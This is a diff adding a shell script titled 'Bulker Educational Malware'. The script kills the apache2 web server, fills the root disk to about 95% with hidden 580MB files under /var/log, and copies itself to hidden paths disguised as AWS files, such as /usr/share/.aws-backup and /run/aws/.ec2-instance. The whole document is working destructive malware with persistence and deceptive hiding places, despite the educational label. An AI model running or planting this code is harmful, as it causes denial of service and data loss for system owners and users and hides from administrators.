@@ -1,0 +1,60 @@
+#!/bin/sh
+# Bulker Educational Malware
+# Fill up disk space, kill apache2 web server, and self-replicate.
+# - January 7th, 2022
+
+
+# Check to see if apache is running
+APACHE_RUN=/run/apache2/apache2.pid
+
+
+# Backup location to replicate the bulker malware to
+BACKUP_ONE=/usr/share/.aws-backup
+BACKUP_TWO=/run/aws/.ec2-instance
+
+
+# Make the aws directory in /run to hide the 2nd backup in
+FAKE_RUN=/run/aws
+if ! [ -d "$FAKE_RUN" ]
+then
+	mkdir $FAKE_RUN
+fi
+
+
+# Function to replicate and run the bulker malware
+builder () {
+	if ! [ -f "$1" ] 
+	then
+		echo "This is 0: $0   This is 1: $1   This is directory: $(pwd)"
+		cp $0 $1 && chmod 700 $1
+	fi
+}
+
+
+# Shut down apache2 server
+if [ -f "$APACHE_RUN" ] 
+then
+	systemctl kill apache2
+fi	
+
+
+# File Bulking
+DISKSPACE=$(df /dev/root | awk '{print $5 }' | tail -n 1 | cut -d'%' -f1)
+GB_PRCNT=7
+while [ $DISKSPACE -lt 95 ]
+do
+	LOG_LOCATION='/var/log/.bulker'
+	NUM=0
+	FILE_NAME=$LOG_LOCATION.log
+	while [ -e "$FILE_NAME" ]; do
+       		printf -v FILE_NAME '%s.log.%1d' "$LOG_LOCATION" "$(( ++NUM ))"
+	done
+	fallocate -l 580MB $FILE_NAME
+	DISKSPACE=$(( $DISKSPACE + $GB_PRCNT ))
+done
+
+
+# Create the backup bulker malware, if it does not exist already. 
+builder $BACKUP_ONE
+builder $BACKUP_TWO
+
